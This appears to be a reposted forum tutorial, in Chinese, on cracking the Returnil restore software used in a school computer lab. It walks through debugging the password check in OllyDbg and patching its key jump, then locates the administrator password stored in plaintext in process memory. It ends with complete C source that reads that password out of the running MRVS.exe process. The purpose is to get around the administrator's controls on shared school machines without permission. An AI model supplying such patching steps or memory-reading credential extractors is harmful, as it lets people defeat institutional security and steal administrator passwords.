@@ -1,0 +1,242 @@
+
+
+# 破解并编程读取学校机房 Returnil 还原软件密码
+
+> 原文：[`www.pediy.com/kssd/pediy12/135085.html`](https://www.pediy.com/kssd/pediy12/135085.html)
+
+【文章标题】: 破解并编程读取学校机房 Returnil 还原软件密码（新人第一次申请邀请码）  
+【文章作者】: 玉界龙儿  
+【编写语言】: Microsoft Visual C++ 6.0  
+【使用工具】: OllyDBG + 记事本 + VC6.0  
+【操作平台】: windows 2003  
+【作者声明】: 这是我这个新手的首个作品，虽然技术含量不高，但是希望能得到大家的点评。  
+  
+  学校实验室机房所用的还原软件是 Returnil，想装软件装不上，总是被还原，关于选项中没有列出版本号，可能是破解版的吧，不过看版权的年份还是比较久的了，最适合新手练习了，如<图一>  
+  ![](img/c363e9ea15e9c757b4837734e6a99c76.jpg)  
+  用任务管理器看看进程，Returnil 的进程是 MRVS.exe，结束进程没有效果，重启依然还原，这是很明显的，这个应用程序只不过是负责和底层驱动进行通讯而已。  
+  双击任务栏上反转的 R 的图标，弹出一个输入密码提示框，<图二>所示  
+  ![](img/d9df9b6fc01e8c97ffc1328159b0a51b.jpg)  
+  随便输入一个密码，点击确定，窗口直接关闭，没有任何提示。  
+  拿出 OllyDBG 附加进程 MRVS.exe，附加后，在右键->view->module "MRVS"，就可以到达 MRVS 的代码段(ps：有时，选择模块的时候没有立刻跳转到对应的代码段，可以选多几次)  
+  利用右键->Ultra String Reference->FindASCII，然后找到关键的字符串，如<图三>所示  
+  ![](img/aba6d349ed1c940776e986cfbcd1a68d.jpg)  
+  有两个很相似的字符串，可以看出第一个是重设密码的窗口，第二个是我们想要的，在 OO4C72AB 上面双击，跟进代码段，按 ctrl+A 分析一下  
+  
+
+代码:
+
+```
+004C72A8   .  53            push    ebx
+  004C72A9   .  8BD8          mov     ebx, eax
+  004C72AB   .  BA 04734C00   mov     edx, 004C7304                    ;  returnil 影子系统(多分区版)
+  004C72B0   .  8BC3          mov     eax, ebx
+  004C72B2   .  E8 8D50F8FF   call    0044C344
+  004C72B7   .  BA 28734C00   mov     edx, 004C7328                    ;  请输入管理员密码
+  004C72BC   .  8B83 04030000 mov     eax, dword ptr \[ebx+304\]
+  004C72C2   .  E8 7D50F8FF   call    0044C344
+  004C72C7   .  BA 44734C00   mov     edx, 004C7344                    ;  密码：
+  004C72CC   .  8B83 F8020000 mov     eax, dword ptr \[ebx+2F8\]
+  004C72D2   .  E8 6D50F8FF   call    0044C344
+  004C72D7   .  BA 54734C00   mov     edx, 004C7354                    ;  确定
+  004C72DC   .  8B83 0C030000 mov     eax, dword ptr \[ebx+30C\]
+  004C72E2   .  E8 5D50F8FF   call    0044C344
+  004C72E7   .  BA 64734C00   mov     edx, 004C7364                    ;  取消
+  004C72EC   .  8B83 10030000 mov     eax, dword ptr \[ebx+310\]
+  004C72F2   .  E8 4D50F8FF   call    0044C344
+  004C72F7   .  5B            pop     ebx
+  004C72F8   .  C3            retn
+
+```
+
+  可以看出这是创建密码输入界面的代码，在 004C72A8 设置断点，关掉密码输入框，双击任务栏图标，密码输入窗口没有弹出，断下来了，按 ctrl+F9 执行到返回，再 F8 慢慢单步跟踪  
+代码:
+
+```
+004C7D01   .  8B45 FC       mov     eax, dword ptr \[ebp-4\]
+  004C7D04   .  E8 0B46F8FF   call    0044C314
+  004C7D09   .  8B55 F0       mov     edx, dword ptr \[ebp-10\]
+  004C7D0C   .  8B45 F4       mov     eax, dword ptr \[ebp-C\]
+  004C7D0F   .  E8 3046F8FF   call    0044C344
+  004C7D14   .  8B45 F4       mov     eax, dword ptr \[ebp-C\]
+  004C7D17   .  8B10          mov     edx, dword ptr \[eax\]
+  004C7D19   .  FF92 EC000000 call    dword ptr \[edx+EC\]               ;  密码提示框出现
+  004C7D1F   .  48            dec     eax
+  004C7D20   .  75 27         jnz     short 004C7D49
+  004C7D22   .  8D55 EC       lea     edx, dword ptr \[ebp-14\]
+  004C7D25   .  8B45 F4       mov     eax, dword ptr \[ebp-C\]
+
+```
+
+  跟到 004C7D19 这个 CALL 时候，F8 不在断下来了，看来是进入了消息循环当中，在这个 CALL 的下一句指令 004C7D1F 下断，输入任意密码(例如：aabbccdd)，按确定，果然断下。  
+  然后依然 F7 步进/F8 步过进行跟踪，惊奇的发现，有个过程名称 MRVS.fcCheckPassword 被分析出来了，这也太水了吧，明显是比较密码啊呵呵  
+代码:
+
+```
+004C7D1F   .  48            dec     eax
+  004C7D20   .  75 27         jnz     short 004C7D49
+  004C7D22   .  8D55 EC       lea     edx, dword ptr \[ebp-14\]
+  004C7D25   .  8B45 F4       mov     eax, dword ptr \[ebp-C\]
+  004C7D28   .  8B80 FC020000 mov     eax, dword ptr \[eax+2FC\]
+  004C7D2E   .  E8 E145F8FF   call    0044C314    ;  这个 call 后，堆栈出现刚才输入的错误密码
+  004C7D33   .  8B45 EC       mov     eax, dword ptr \[ebp-14\]
+  004C7D36   .  E8 A1C6F3FF   call    004043DC
+  004C7D3B   .  50            push    eax
+  004C7D3C   .  E8 BBFEFFFF   call    <jmp.&MRVS.fcCheckPassword>  ;  这个名字很容易理解
+  004C7D41   .  84C0          test    al, al                       ;  判断返回值是否为 0
+  004C7D43   .  74 04         je      short 004C7D49               ;  关键跳转
+  004C7D45   .  C645 FB 01    mov     byte ptr \[ebp-5\], 1
+  004C7D49   >  33C0          xor     eax, eax
+  004C7D4B   .  5A            pop     edx
+  004C7D4C   .  59            pop     ecx
+  004C7D4D   .  59            pop     ecx
+  004C7D4E   .  64:8910       mov     dword ptr fs:\[eax\], edx
+  004C7D51   .  68 667D4C00   push    004C7D66
+
+```
+
+  可以看出 004C7D45 就是关键跳转，把 je 改成 jne，<F9>执行，直接弹出设置页面了，如<图四>  
+  
+  这样就算是暴力破解了，可是我还是菜鸟在学习阶段，不能由此满足，所以决定编写个程序把密码给读取出来。  
+  要读取密码，就要分析密码到底存储在什么地方，在 004C7D3C 这个位置按回车跟进，进入到过程内部，途中经过一个跳转表,下面是比较密码的过程。  
+代码:
+
+```
+00596CD4 >/$  55            push    ebp                          ;  比较密码过程
+  00596CD5  |.  8BEC          mov     ebp, esp
+  00596CD7  |.  83C4 F4       add     esp, -0C
+  00596CDA  |.  53            push    ebx
+  00596CDB  |.  33C0          xor     eax, eax
+  00596CDD  |.  8945 F4       mov     dword ptr \[ebp-C\], eax
+  00596CE0  |.  33C0          xor     eax, eax
+  00596CE2  |.  55            push    ebp
+  00596CE3  |.  68 516D5900   push    00596D51
+  00596CE8  |.  64:FF30       push    dword ptr fs:\[eax\]
+  00596CEB  |.  64:8920       mov     dword ptr fs:\[eax\], esp
+  00596CEE  |.  8D45 F4       lea     eax, dword ptr \[ebp-C\]
+  00596CF1  |.  8B55 08       mov     edx, dword ptr \[ebp+8\]
+  00596CF4  |.  E8 97D6F8FF   call    00524390
+  00596CF9  |.  8D45 F8       lea     eax, dword ptr \[ebp-8\]
+  00596CFC  |.  33C9          xor     ecx, ecx
+  00596CFE  |.  BA 08000000   mov     edx, 8
+  00596D03  |.  E8 08C0F8FF   call    00522D10
+  00596D08  |.  8B45 F4       mov     eax, dword ptr \[ebp-C\]
+  00596D0B  |.  E8 48D7F8FF   call    00524458
+  00596D10  |.  50            push    eax
+  00596D11  |.  8D45 F4       lea     eax, dword ptr \[ebp-C\]
+  00596D14  |.  E8 97D9F8FF   call    005246B0
+  00596D19  |.  8D55 F8       lea     edx, dword ptr \[ebp-8\]
+  00596D1C  |.  59            pop     ecx
+  00596D1D  |.  E8 B6BBF8FF   call    005228D8
+  00596D22  |.  8D55 F8       lea     edx, dword ptr \[ebp-8\]
+  00596D25  |.  A1 D4985900   mov     eax, dword ptr \[5998D4\]
+  00596D2A  |.  05 90000000   add     eax, 90              ;  这里 eax 保存了密码的地址
+  00596D2F  |.  B9 08000000   mov     ecx, 8
+  00596D34  |.  E8 8318F9FF   call    005285BC
+
+```
+
+  在过程中，单步跟踪，在 00596D2A 这句执行后，寄存器窗口如下：、  
+代码:
+
+```
+EAX 0059ACE0 ASCII "011210aa"
+  ECX 00000000
+  EDX 0012FCFC
+  EBX 00DB2A80 ASCII "hxL"
+  ESP 0012FCE8
+  EBP 0012FD04
+  ESI 00498D90 MRVS.00498D90
+  EDI 00000800
+  EIP 00596D2F MRVS\_1I.00596D2F
+  ......
+
+```
+
+  有一个敏感的字符串地址指向："0011210aa"，心想，莫非这就是密码？测试了一下，果然没错。  
+代码:
+
+```
+00596D25  |.  A1 D4985900   mov     eax, dword ptr \[5998D4\]
+  00596D2A  |.  05 90000000   add     eax, 90                      ;  这里 eax 保存了密码的地址
+
+```
+
+  这两句可以看出，地址来自于\[5998D4\]这个基地址，在 OD 的 cmdBar 中输入 db \[5998D4\]+90，转到密码的地址，可以确认密码是存在于基址上的了，很水啊，不过对于一个菜鸟来说已经很兴奋了。  
+  接下来是编程读取密码了，分析出来结果后，编程是非常简单的，代码如下：  
+代码:
+
+```
+// ////////////////////////////////////////////////////////////
+// GetPsw.c
+// ////////////////////////////////////////////////////////////
+#include <windows.h>
+#include <TLHELP32.h>
+#include <string.h>
+#include <stdio.h>
+
+int main()
+{
+  HANDLE hSnap;      //系统快照句柄
+  HANDLE hMRVS;      //还原软件句柄
+  BOOL bMore;        //用于遍历进程快照判断是否读取完成
+  PROCESSENTRY32 pe32;  //进程入口结构体对象
+  DWORD dwPID = -1;    //保存进程的 PID
+  char szPsw\[33\];      //32 位的密码
+
+  //获取进程快照
+  if (NULL == (hSnap = ::CreateToolhelp32Snapshot(TH32CS\_SNAPPROCESS, 0)))
+  {
+    printf("CreateToolhelp32Snapshot failed!\\n");
+    return -1;
+  }
+  printf("CreateToolhelp32Snapshot Success!\\n");
+  
+  pe32.dwSize = sizeof(pe32); //对进程入口结构体大小进行设置
+
+  bMore = ::Process32First(hSnap, &pe32);
+
+  //是查找对应进程的 PID
+  while (bMore)
+  {
+    if (0 == strcmp(strupr(pe32.szExeFile), "MRVS.EXE"))
+    {
+      dwPID = pe32.th32ProcessID;
+      break;
+    }
+    bMore = Process32Next(hSnap, &pe32);
+  }
+  if (-1 == dwPID)
+  {
+    printf("Get the MRVS's PID failed!\\n");
+  }
+  printf("Get the MRVS's PID, is %d\\n", dwPID);
+
+  //打开对应进程
+  if (NULL == (hMRVS = ::OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, dwPID)))
+  {
+    printf("OpenProcess failed! %d\\n", GetLastError());
+  }
+  printf("OpenProcess Success!\\n");
+
+  //\[5998D4\]+90 读出对应地址的密码信息
+  DWORD dwAddr = 0x005998D4;
+  ::ReadProcessMemory(hMRVS, (LPVOID)dwAddr, &dwAddr, 4, NULL);
+  ::ReadProcessMemory(hMRVS, (LPVOID)(dwAddr+0x90), szPsw, 32, NULL);
+
+  printf("The PassWord is %s\\n", szPsw);
+
+  return 0;
+}
+
+```
+
+运行结果<图五>：  
+![](img/d7cb10a8044e94e5875577c13316beb1.jpg)  
+  
+题外话：  
+我这个小菜鸟学技术很辛苦（其实很开心的），虽然之前我都在潜水，希望能给我个邀请码，让我激活一下，挂 1 个小时论坛才长 1 点，真的太难了，下载个东西一下就没有了，100 点用来激活还是遥遥无期啊。如果能让我通过，真的是万分感激！  
+  
+楼下有同学跟帖说要这个软件的下载地址，可是我不知道学校用的这个软件的版本，的确，大家看图就知道，学校用的可能是破解版，不过我在网上搜索到这个，分析起来和我学校机房的这个差不多的，由于附件要点数下载，直接发个网址了  
+在多特软件，华军，天空等软件站里，搜索 “ Returnil 多分区保护影子系统 ”，就出现了，给个链接：http://www.duote.com/soft/12952.html （多特的）  
+  
+![](img/75213fd6503c514ba1eea56a952a600a.jpg)
